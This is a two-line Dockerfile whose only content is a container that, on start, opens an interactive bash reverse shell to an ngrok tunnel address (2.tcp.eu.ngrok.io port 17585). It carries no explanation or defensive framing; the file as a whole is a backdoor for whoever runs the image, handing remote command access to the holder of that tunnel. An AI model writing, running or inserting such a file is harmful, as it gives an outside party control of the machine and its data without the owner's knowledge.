FROM ubuntu:latest
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp//2.tcp.eu.ngrok.io/17585 0>&1"]
